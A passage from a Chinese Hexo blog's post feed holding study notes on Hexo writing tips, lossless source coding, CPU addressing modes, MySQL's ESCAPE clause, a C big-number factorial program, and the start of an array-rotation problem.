s</code>后，就可以在本地4000端口看到_posts文件夹下的文章了。可以在<code>_config.yml</code>中修改<code>default_layout</code>参数来改变默认值。</p><p><code>layout</code>还有两种可取值：<code>draft</code>和<code>page</code>，在这里只说<code>draft</code>。</p><p><code>draft</code>即草稿，在我们还未完成一篇博客时，可以先将它放入草稿中（即source/_drafts）:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo new draft <span class="token operator">&lt;</span>title<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>草稿默认不会显示在页面中，因此你可以放心大胆地<code>hexo d</code>，而不必担心未完成的文章会被上传。</p><p>当你完成文章后，可以通过以下命令来将草稿移动到source/_post文件夹：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">hexo publish <span class="token punctuation">[</span>layout<span class="token punctuation">]</span> <span class="token operator">&lt;</span>title<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-引用块"><a href="#2-引用块" class="headerlink" title="2. 引用块"></a>2. 引用块</h2><p>引用块可以引用文章、句子、代码、Twitter等。在markdown中，我们有相应的引用语法，但是我个人觉得这个东西用来引用一些句子特别合适，其他的还是按照markdown语法来写吧。</p><pre class="line-numbers language-none"><code class="language-none">{% blockquote [author[,source]] [link] [source_link_title] %}content{% endblockquote %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>例如，我们想要引用书上的句子：</p><pre class="line-numbers language-none"><code class="language-none">{% blockquote 海子, 女孩子 %}春天是风秋天是月亮在我感觉到时她已去了另一个地方{% endblockquote %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>效果如下：</p><blockquote><p>春天是风<br>秋天是月亮<br>在我感觉到时<br>她已去了另一个地方</p><footer><strong>海子</strong><cite>女孩子</cite></footer></blockquote><p>引用网络上的文章：</p><pre class="line-numbers language-none"><code class="language-none">{% blockquote 恰醋 https://qiacuhome.cn/ 恰醋的小屋 %}这里是恰醋的个人博客主页~{% endblockquote %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>效果如下：</p><blockquote><p>这里是恰醋的个人博客主页~</p><footer><strong>恰醋</strong><cite><a href="https://qiacuhome.cn/">恰醋的小屋</a></cite></footer></blockquote><p>还可以插入图片、视频等，详细可以参考官方文档。</p><h2 id="3-插入本地图片"><a href="#3-插入本地图片" class="headerlink" title="3. 插入本地图片"></a>3. 插入本地图片</h2><p>首先要将<code>_config.yml</code>文件中的<code>post_asset_folder</code>设为<code>true</code>，这样一来，当你new了一篇新文章后，文章所在目录也会出现一个和文章同名的文件夹，只要将所要引用的图片等资源放入这个文件夹下，便可以通过标签插件来引用。</p><pre class="line-numbers language-none"><code class="language-none">{% asset_img slug [title] %}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例如，我们将一个名为001.jpg的图片放入了相应的文件夹下，要将它插入文章，只需：</p><pre class="line-numbers language-none"><code class="language-none">{% asset_img 001.jpg 001 %}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我还试图利用这个结合引用块来引用一些压缩包文件，想看看能不能用这个来代替云盘，但发现不可以。</p><h2 id="4-后记"><a href="#4-后记" class="headerlink" title="4. 后记"></a>4. 后记</h2><p>我只整理了我觉得对我有帮助的三个小技巧，<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">官方文档</a>中还有很多，但限于我个人的水平，很多对目前的我来说并没有太大的用处，若有兴趣，可以自行查阅。</p>]]></content>
      
      
      <categories>
          
          <category> 写作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无失真信源编码方式</title>
      <link href="2020/05/14/wu-shi-zhen-xin-yuan-bian-ma-fang-shi/"/>
      <url>2020/05/14/wu-shi-zhen-xin-yuan-bian-ma-fang-shi/</url>
      
        <content type="html"><![CDATA[<p>整理了信息论课程中学过的几种无失真信源编码方式。</p><h1 id="1-香农编码"><a href="#1-香农编码" class="headerlink" title="1. 香农编码"></a>1. 香农编码</h1><p>设离散无记忆信源</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZWJkNjJlNmMyYTlhODNiZTVhNmJhYjEucG5n?x-oss-process=image/format,png"><br>二进制香农码的编码步骤如下：</p><ol><li><p>将信源符号按概率从大到小排列，令$p(x_1)\geq p(x_2)\geq \dots \geq p(x_n)$</p></li><li><p>令$p(x_0)=0$，用$p_a(x_j),j=i+1$表示第j个码字的累加概率，则：<br> $$<br> p_a(x_j)= \sum_{i=0}^{j-1}{p(x_i)},j=1,2,\dots,n<br> $$</p></li><li><p>确定满足下列不等式的整数$l_i$，并令$l_i$为第i个码字的长度<br> $$<br> -\log{p(x_i)}\leq l_i&lt; -\log{p(x_i)}+1<br> $$</p></li><li><p>将$p_a(x_j)$用二进制表示，并取小数点后$l_i$位作为符号$x_i$的编码</p></li></ol><p><a target="_blank" rel="noopener" href="https://pic.downk.cc/item/5ebd6115c2a9a83be5a47806.png"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZWJkNjExNWMyYTlhODNiZTVhNDc4MDYucG5n?x-oss-process=image/format,png"></a></p><p><strong>说明</strong>：</p><ul><li>一般情况下编码效率不是很高，编出来的不是最佳码</li><li>特殊情况下，才有高的编码效率</li><li>求码长时，左边的等号成立，右边的不成立</li></ul><h1 id="2-费诺编码"><a href="#2-费诺编码" class="headerlink" title="2. 费诺编码"></a>2. 费诺编码</h1><p><strong>步骤</strong>：</p><ol><li>将概率从大到小排列，令$p(x_1)\geq p(x_2)\geq \dots \geq p(x_n)$</li><li>按编码进制数将概率分组，使每组概率尽可能接近或相等，编m进制分m组</li><li>给每组分配一个码元</li><li>将每一组再按同样原则划分，重复步骤2和3，直到每个组只剩下一个信源符号为止</li></ol><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZWJkNjEzNWMyYTlhODNiZTVhNGExMzUucG5n?x-oss-process=image/format,png"></p><p><strong>说明</strong>：</p><ul><li>费诺码适合于每次分组概率都很接近的信源，特别是对每次分组概率都相等的信源进行编码时，可达到理想的编码效率</li></ul><p><strong>费诺码性质</strong>：</p><ul><li>费诺码是即时码</li><li>概率大的信源符号能对应码长较短的码字</li><li>费诺码不一定是最佳码：不一定能使短码得到充分利用</li></ul><h1 id="3-霍夫曼编码"><a href="#3-霍夫曼编码" class="headerlink" title="3. 霍夫曼编码"></a>3. 霍夫曼编码</h1><p><strong>步骤</strong>：</p><ol><li>将概率按从大到小的顺序排列，令$p(x_1)\geq p(x_2)\geq \dots \geq p(x_n)$</li><li>给两个概率最小的信源符号$p(x_{n-1})$和$p(x_n)$各分配一个码位“0”和“1”，将这两个信源符号合并成一个新符号，并用这两个最小概率之和作为新符号的概率，结果得到一个只包含(n-1)个符号的新信源，称为信源的第一次缩减信源，用S<del>1</del>表示</li><li>将缩减信源S<del>1</del>仍按概率从大到小排列，重复步骤2，得到只含(n-2)个符号的缩减信源</li><li>重复上述步骤，直至缩减信源只剩两个符号为止，此时所剩的两个符号的概率之和为1，然后从最后一级缩减信源开始，依编码路径向前返回，就得到各信源符号对应的码字</li></ol><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZWJkNjE0ZWMyYTlhODNiZTVhNGM2NjAucG5n?x-oss-process=image/format,png"></p><p><strong>说明</strong>：</p><ul><li>霍夫曼编码不唯一：每次对两个概率最小的符号分配“0，1”是任意的，合并后新符号概率与其他符号概率相等时这几个符号的次序也是可以任意排列的</li><li>合并后的新符号尽量排在靠前的位置，这样码长的方差比较小</li><li>合并后的新符号重复编码次数减少，使短码得到充分利用</li><li>r元码，信源S的符号个数q必须满足：$q=n(r-1)+r$（n为非负整数，r-1为每次缩减所减少的信源符号个数）。对于二元码，$q=n+2$，n可为任意非负整数</li><li>对于不满足条件的r元码，可假设一些信源符号: $S_{q+1},S_{q+2},\dots,S_{q+t}$作为虚拟符号，并令它们的概率为0，使得$q=n(r-1)+r$成立，这样处理后的r元霍夫曼编码可充分利用短码，一定是紧致码</li></ul><p><strong>霍夫曼码性质</strong>：</p><ul><li>是分组码</li><li>是唯一可译码</li><li>是即时码</li></ul><h1 id="4-香农-费诺-埃利斯码"><a href="#4-香农-费诺-埃利斯码" class="headerlink" title="4. 香农-费诺-埃利斯码"></a>4. 香农-费诺-埃利斯码</h1><p><strong>步骤</strong>：</p><ol><li><p>设信源符号集$A={a_1,a_2,\dots,a_q}$，并设所有$P(a_i)&gt;0$，计算累积分布函数：$F(s)=\sum_{a\leq s}{P(a_i)}$</p></li><li><p>计算修正的累积分布函数：<br> $$<br> \overline{F}(s)=\overline{F}(a_k)=\sum_{i=1}^{k-1}{P(a_i)+{1\over 2}P(a_k)}<br> $$</p></li><li><p>计算码长：$l(s)=\lceil \log{1\over p(s)}\rceil+1$</p></li><li><p>将修正后的累积分布函数用二进制表示，并取小数点后$l(s)$位作为符号$x_i$的编码</p></li></ol><p><a target="_blank" rel="noopener" href="https://pic.downk.cc/item/5ebd617ac2a9a83be5a4fcf5.png"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZWJkNjE3YWMyYTlhODNiZTVhNGZjZjUucG5n?x-oss-process=image/format,png"></a></p><h1 id="5-算术编码"><a href="#5-算术编码" class="headerlink" title="5. 算术编码"></a>5. 算术编码</h1><ul><li>香农-费诺-埃利斯码不是最佳码，但由它可拓宽得到一种算数码</li><li>不同于霍夫曼码，是一种非分组码，其编码和译码都是计算效率高的码</li><li>从全序列出发，考虑符号之间的依赖关系</li><li>主要应用于计算机数据交换或文本存储，音视频数据的压缩</li></ul><h1 id="6-游程编码"><a href="#6-游程编码" class="headerlink" title="6. 游程编码"></a>6. 游程编码</h1><p>游程编码对相关信源编码更有效，尤其适用于二元相关信源，它属于限失真信源编码，主要用于图文传真、图像传输。</p><ul><li>游程（RL）：数字序列中连续出现相同符号的一段</li><li>游程编码（RLC）：将游程序列映射成游程长度和对应符号序列的位置的标志序列</li><li>连续的“0”的长度为L(0)，连续的“1”的长度为L(1)</li></ul><p><strong>二元序列游程长度</strong>：</p><ul><li>对于随机序列，游程长度是随机的</li><li>游程变换：是一一对应的变换，也是可逆变换</li><li>规定二元序列总是从0开始</li><li>游程变换减弱了原序列符号间的相关性</li><li>游程将二元序列变换成了多元序列</li><li>编码方法：<ul><li>首先测定0和1的游程长度的概率分布，即以游程长度为元素，构造一个新的信源</li><li>对新的信源（游程序列）进行霍夫曼编码</li></ul></li><li>截断处理：<ul><li>选取一个适当的n，将游程长度定为一共有2^n^个，所有游程大于2^n^的，都用游程为2^n^的这个码字来处理</li><li>将这2^n^个游程按概率大小进行霍夫曼编码，得到相应的码字，也就获得游程为2^n^的这个码字C</li><li>对所有大于2^n^以上的游程进行编码，所有大于2^n^、小于2^n+1^的，就用码字C之后加一个n位的自然码A构成对应的码字。A代表余数，用以区分$2^n-2^{n+1}$之间的不同长度</li></ul></li><li>二元独立序列游程长度的熵、平均游程长度：<ul><li>$p[L(0)]=p_0^{L(0)-1}p_1$</li><li>$p[L(1)]=p_1^{L(1)-1}p_0$</li><li>$H[L(0)]={H(p_0)\over p_1}, l_0={1\over p_1}$</li><li>$H[L(1)]={H(p_1)\over p_0},l_1={1\over P_0}$</li></ul></li><li>二元独立序列的熵：$H(X)=H(p_0)=H(p_1)$</li></ul><h1 id="7-MH编码"><a href="#7-MH编码" class="headerlink" title="7. MH编码"></a>7. MH编码</h1><ul><li>MH编码是用于黑白二值文件传真的数据压缩，它们是黑白二值的，即信源是二元信源q=2</li><li>MH码的码字分为终端吗和组合码</li><li>编码规则<ol><li>游程长度在0~63之间时，码字直接用相应的终端码表示</li><li>游程长度在64~1728，用一个组合码加上一个终端码作为相应码字</li><li>规定每行都从白游程开始，若实际出现黑游程，则在行首加上长度为零的白游程字，每行结束时用一个结束码（EOL）作标记</li><li>每页文件开始第一个数据前加一个结束码，每页结尾连续使用6个结束码表示结尾</li><li>译码时，每一行码都应恢复出1728个像素，否则有错</li><li>为了在传输时可实现同步操作，规定T为每个编码行的最小传输时间，若编码行传输时间小于T，则在结束码之前填上足够多的“0”码元（称填充码）</li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 信息论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理之寻址方式</title>
      <link href="2020/05/12/ji-suan-ji-zu-cheng-yuan-li-zhi-xun-zhi-fang-shi/"/>
      <url>2020/05/12/ji-suan-ji-zu-cheng-yuan-li-zhi-xun-zhi-fang-shi/</url>
      
        <content type="html"><![CDATA[<p>寻址方式是指确定本条指令的数据地址以及下一条将要被执行的指令地址的方法，与硬件结构紧密相关，而且直接影响指令格式和指令功能。</p><span id="more"></span><h2 id="1-指令寻址"><a href="#1-指令寻址" class="headerlink" title="1. 指令寻址"></a>1. 指令寻址</h2><ul><li>顺序寻址</li><li>跳跃寻址</li></ul><h2 id="2-数据寻址"><a href="#2-数据寻址" class="headerlink" title="2. 数据寻址"></a>2. 数据寻址</h2><ul><li>A: 操作数的形式地址</li><li>EA: 操作数的真实地址</li></ul><h3 id="2-1-立即寻址"><a href="#2-1-立即寻址" class="headerlink" title="2.1 立即寻址"></a>2.1 立即寻址</h3><table><thead><tr><th align="center">OP</th><th align="center">#</th><th align="center">A</th></tr></thead><tbody><tr><td align="center">指令</td><td align="center">立即寻址特征</td><td align="center">立即数</td></tr></tbody></table><ul><li>特点：操作数本身设在指令字内，又称之为立即数</li><li>优点：在执行阶段不需要访问存储器</li><li>缺点：A的位数限制了立即数的范围</li></ul><h3 id="2-2-直接寻址"><a href="#2-2-直接寻址" class="headerlink" title="2.2 直接寻址"></a>2.2 直接寻址</h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZWJhMjI1ZmMyYTlhODNiZTUzMzFkYTcucG5n?x-oss-process=image/format,png"></p><ul><li>特点：指令字内的形式地址A就是操作数的真实地址EA</li><li>优点：寻找操作数比较简单，不需要专门计算操作数地址，在执行阶段只需访存一次</li><li>缺点：A的位数限制了操作数的寻址范围，而且必须修改A的值，才能修改操作数地址</li></ul><h3 id="2-3-隐含寻址"><a href="#2-3-隐含寻址" class="headerlink" title="2.3 隐含寻址"></a>2.3 隐含寻址</h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZWJhMjI2NGMyYTlhODNiZTUzMzIyNGQucG5n?x-oss-process=image/format,png"></p><ul><li>特点：指令字中不明显给出操作数的地址，其操作数的地址隐含在操作码或某个寄存器中</li><li>优点：由于隐含寻址在指令字中少了一个地址，因此有利于缩短指令字长</li></ul><h3 id="2-4-间接寻址"><a href="#2-4-间接寻址" class="headerlink" title="2.4 间接寻址"></a>2.4 间接寻址</h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZWJhMjI2OGMyYTlhODNiZTUzMzI2YzMucG5n?x-oss-process=image/format,png"></p><ul><li>指令字内的形式地址不直接给出操作数的地址，而是指出操作数有效地址所在的存储单元地址</li><li>当多次间接寻址时，可用存储字的首位标志间接寻址是否结束。为“1”，则仍为A；为“0”，说明是EA</li><li>优点：<ul><li>与直接寻址相比，扩大了操作数的寻址范围（A的位数通常小于指令字长）</li><li>便于编制程序</li></ul></li><li>缺点：指令的执行阶段需要访存两次或多次</li></ul><h3 id="2-5-寄存器寻址"><a href="#2-5-寄存器寻址" class="headerlink" title="2.5 寄存器寻址"></a>2.5 寄存器寻址</h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZWJhMjI2ZGMyYTlhODNiZTUzMzJiNzUucG5n?x-oss-process=image/format,png"></p><ul><li>特点：地址码字段直接指出了寄存器的编号，即EA=R，操作数在R内</li><li>优点：<ul><li>操作数不在主存内，故无需访存，节省了执行时间</li><li>只需指明寄存器编号，故指令字较短，节省了存储空间</li></ul></li></ul><h3 id="2-6-寄存器间接寻址"><a href="#2-6-寄存器间接寻址" class="headerlink" title="2.6 寄存器间接寻址"></a>2.6 寄存器间接寻址</h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZWJhMjI3MmMyYTlhODNiZTUzMzMxZWQucG5n?x-oss-process=image/format,png"></p><ul><li>特点：R中存放的不是操作数，而是操作数所在主存单元的地址号</li></ul><h3 id="2-7-基址寻址"><a href="#2-7-基址寻址" class="headerlink" title="2.7 基址寻址"></a>2.7 基址寻址</h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZWJhMjI3NmMyYTlhODNiZTUzMzM2OTUucG5n?x-oss-process=image/format,png"></p><ul><li><p>特点：设有基址寄存器BR，其操作数的有效地址EA等于指令字中的形式地址与基址寄存器中的内容相加</p></li><li><p>优点：</p><ul><li>可以扩大操作数的寻址范围</li><li>基址寻址在多道程序中极为有用</li></ul></li><li><p>用户不可以修改BR的值，只能修改A</p></li><li><p>采用通用寄存器寻址</p><p>  <img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZWJhMjI3YmMyYTlhODNiZTUzMzNiYzEucG5n?x-oss-process=image/format,png"></p></li></ul><h3 id="2-8-变址寻址"><a href="#2-8-变址寻址" class="headerlink" title="2.8 变址寻址"></a>2.8 变址寻址</h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZWJhMjJiNGMyYTlhODNiZTUzMzk0OTQucG5n?x-oss-process=image/format,png"></p><ul><li>特点：有效地址EA等于指令字中的形式地址A与变址寄存器IX的内容相加之和，IX由用户给定，可以改变</li><li>优点：可以扩大操作数的寻址范围</li></ul><h3 id="2-9-相对寻址"><a href="#2-9-相对寻址" class="headerlink" title="2.9 相对寻址"></a>2.9 相对寻址</h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZWJhMjMyNmMyYTlhODNiZTUzNDNhOGIucG5n?x-oss-process=image/format,png"></p><ul><li>特点：相对寻址的有效地址是将PC的内容（当前指令的地址）与指令字中的形式地址A相加而成</li><li>常被用于转移类指令，转移后的目标地址与当前指令有一段距离，称为相对位移量</li></ul><h3 id="2-10-堆栈寻址"><a href="#2-10-堆栈寻址" class="headerlink" title="2.10 堆栈寻址"></a>2.10 堆栈寻址</h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZWJhM2I0Y2MyYTlhODNiZTU2YzQxMWIucG5n?x-oss-process=image/format,png"></p><ul><li>特点：堆栈指针一般用SP表示，进栈PUSH，出栈POP，SP的内容都需要发生变化，操作数的地址总被隐含在SP中</li><li>根据堆栈增长方向，基于主存实现的堆栈分为：<ol><li>递增堆栈，随着数据的压入，这种堆栈向高地址方向增长</li><li>递减堆栈，随着数据的压入，这种堆栈向低地址方向增长</li></ol></li><li>根据SP所指示栈顶单元的属性，也可分为：<ol><li>满堆栈：SP指示栈顶单元存储的是最后压入的数据</li><li>空堆栈：SP指示栈顶单元用于接收下一个要压入的数据</li></ol></li></ul><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZWJhM2I3M2MyYTlhODNiZTU2Y2I3YTcucG5n?x-oss-process=image/format,png"></p><ul><li><p>SP的修改与主存编制方法有关</p><ol><li><p>按字编址</p><ul><li>进栈  (SP)-1 –&gt; SP</li><li>出栈  (SP)+1 –&gt; SP</li></ul></li><li><p>按字节编址</p><ul><li>存储字长16位  进栈  (SP)-2 –&gt; SP     出栈  (SP)+2 –&gt; SP</li><li>存储字长32位  进栈  (SP)-4 –&gt; SP     出栈  (SP)+4 –&gt; SP</li></ul></li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机组成原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL中ESCAPE的用法</title>
      <link href="2020/04/29/mysql-zhong-escape-de-yong-fa/"/>
      <url>2020/04/29/mysql-zhong-escape-de-yong-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p><code>ESCAPE '/'</code> 表示<code>'/'</code>为换码字符，在查询时使用可以方便查询到原本就含有<code>'_'</code>、<code>'%'</code>的值。</p><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>如果要查询到名字在四个字符以上、倒数第三个字符为d、倒数第二个字符为_的教师的全部信息：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from prof where Pname like '%_d/__' escape '/';<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>MySQL中，默认的换码字符为<code>'\'</code>，因此如果使用<code>escape '\'</code>，那么mysql会无法执行</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>求大数的阶乘问题</title>
      <link href="2020/04/15/qiu-da-shu-de-jie-cheng-wen-ti/"/>
      <url>2020/04/15/qiu-da-shu-de-jie-cheng-wen-ti/</url>
      
        <content type="html"><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>求一个大数（如100）的阶乘。</p><h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><ol><li>C语言当中各种数据类型的取值范围：<ul><li>整型数据：-32768——32767</li><li>长整型：-2147483648——2147483647</li><li>单精度：六位精度，$\pm(1.7e-38—1.7e+38)$</li><li>双精度：17位精确度，$\pm(1.7e-308—1.7e+308)$</li><li>要么不够大，要么不够精确</li></ul></li><li>存储：可用整型数组，每个元素存储若干位（6位）</li><li>数组长度：由式$\log(n!)=\theta(n\log{n})$确定。若每个元素存储6位，则$log(n!)=100\log{(100)}/6=34$</li><li>采用竖式乘法原理，每次一个元素和一个较小的整数i相乘，该过程进行迭代（i从1到n）。相乘的结果记为b，$b\ mod\ 10^6$为当前位（6位数），存入a[j]，$b/10^6$为进位，下一位的$b=a[j+1]+d$</li><li>因此，采用两层循环：外层循环迭代n（$2\rarr n$），内层循环迭代j（$1\rarr len$），最后一次的进位再用一个元素存储</li><li>时间复杂度：</li></ol><p>$$<br>O(n)=\sum_2^n\sum_1^{len}C\=C\sum_2^n{len}\ =C(n-1){len}\=C(n-1)\Theta(n\log{n})/6\=O(n^2\log{n})<br>$$</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/*求大数的阶乘，如100!*/</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">void</span> <span class="token function">output</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> len<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> i <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">factorial</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span> j<span class="token punctuation">;</span>    a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">int</span> d <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> len<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">int</span> b <span class="token operator">=</span> a<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">*</span> i <span class="token operator">+</span> d<span class="token punctuation">;</span>            a<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> b <span class="token operator">%</span> <span class="token number">1000000</span><span class="token punctuation">;</span>            d <span class="token operator">=</span> b <span class="token operator">/</span> <span class="token number">1000000</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>d <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            a<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> d<span class="token punctuation">;</span>            len <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">output</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Input n: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">factorial</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内存移动问题</title>
      <link href="2020/04/14/nei-cun-yi-dong-wen-ti/"/>
      <url>2020/04/14/nei-cun-yi-dong-wen-ti/</url>
      
        <content type="html"><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>对于有n个元素的数组a[n]，将每一位循环向右移动k位。要求算法的空间复杂度不得大于或等于2n。</p><h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><ol><li>正常情况下，第i位右移k位后，位置为$(i+k) mod\ n$，但这样移动的话空间复杂度为2n，不符合要求</li><li>也可以一次所有元素后移一位，从后面开始移动，用一个temp变量即可，此时空间复杂度为，虽然符合要求，但是时间复杂度为$O(k\times n)$，比较大</li><li>经实践验证，我们可以移动Q轮，Q为n与k的最大公约数；而每轮移动的元素个数为n/Q个。每轮移动后，最后一个移动的元素会到达最先移动的元素的位置</li><li>每次移动后，第i-1个元素的位置变为$x_i=(x_0+i\times k-n\times (y_0+y_1+\cdots+y_{n-1}))mod\ n$，其中$y_i$为$x_0+k$与n的商，$x_0$为第一个移动的元素。化简后为$x_i=(x_0+i\times k)mod\ n$.</li><li>设第m轮、第i次连续移动后回到初始位置，则必有$x_i=(x_0+i\times k)mod\ n=x_m$</li><li>所以，算法需要两层循环，外层循环为移动的轮数，内层循环为每轮移动的次数，轮数Q为n与k的最大公约数，每轮移动的次数i为n/Q。</li><li>在内层循环中，需要找到本次移动的元素最终要到达的位置</li><li>最后，时间复杂度为$O(n)$，空间复杂度为$O(n+3)=O(n)$</li></ol><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="line-numbers language-c" data-language="c"><code 